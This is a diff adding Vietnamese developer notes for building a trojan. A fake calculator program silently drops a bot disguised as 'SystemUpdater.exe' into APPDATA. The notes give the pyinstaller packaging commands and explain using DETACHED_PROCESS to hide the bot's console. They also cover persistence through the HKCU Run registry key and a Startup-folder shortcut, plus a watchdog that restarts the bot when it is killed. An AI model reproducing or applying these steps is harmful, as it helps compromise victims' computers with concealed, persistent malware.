@@ -1,0 +1,42 @@
+SystemUpdater.exe được copy vào APPDATA\Roaming
+Bot chạy ngầm (Có thấy console) 
+trong Task Manager dưới tên SystemUpdater.exe.
+
+Registry có mục SystemUpdater 
+trong HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+==========================================================================================
+Để DEBUG
+file calculator dùng: CREATE_NEW_CONSOLE để dropbot để mở cửa sổ mới tách 
+
+file bot dùng: CREATE_NEW_CONSOLE để watchdog khởi động lại mở cửa sở            
+Khi đóng gói file bot ko thêm tham số --noconsole
+
+==========================================================================================
+Đóng gói bot_test_V1.py :
+pyinstaller --onefile --hidden-import=psutil bot_test_V1.py
+Copy C:\TrojanFiles\dist\bot_test_V1.exe thành SystemUpdater.exe xong chuyển đến thư mục ngoài
+copy dist\bot_test_V1.exe SystemUpdater.exe
+
+Đóng gói calculator_trojan.py:
+    Đảm bảo SystemUpdater.exe đã có trong C:\TrojanFiles.
+pyinstaller --noconsole --onefile --add-data "SystemUpdater.exe;." --hidden-import=psutil --hidden-import=tkinter --hidden-import=pywin32 calculator_trojan_V1.py
+
+
+Trong drop_bot() của calculator_trojan.py, thay subprocess.CREATE_NEW_CONSOLE bằng subprocess.DETACHED_PROCESS để bot không mở terminal khi khởi động lần đầu.
+subprocess.CREATE_NEW_CONSOLE : Tạo một cửa sổ console mới cho tiến trình con và chạy nó trong console đó. Tiến trình con sẽ độc lập với console của tiến trình cha
+subprocess.DETACHED_PROCESS   : Chạy tiến trình con như một tiến trình độc lập, chạy ngầm, không hiển thị trên terminal
+subprocess.CREATE_NO_WINDOW   : vẫn phụ thuộc vào console của tiến trình cha
+
+================================================================================================
+Log ghi vào:
+APPDATA\trojan.log (hoạt động trojan).
+APPDATA\system_log.txt (trạng thái bot, mỗi 30 giây).
+
+Mở regedit: Tìm HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\SystemUpdater.
+Nếu Registry thất bại, kiểm tra APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdater.lnk
+
+Thử xóa APPDATA\SystemUpdater.exe -> Báo "File in use".
+Kill bot trong Task Manager -> Watchdog khởi động lại sau ~10 giây.
+
+=====================================================================================================
+
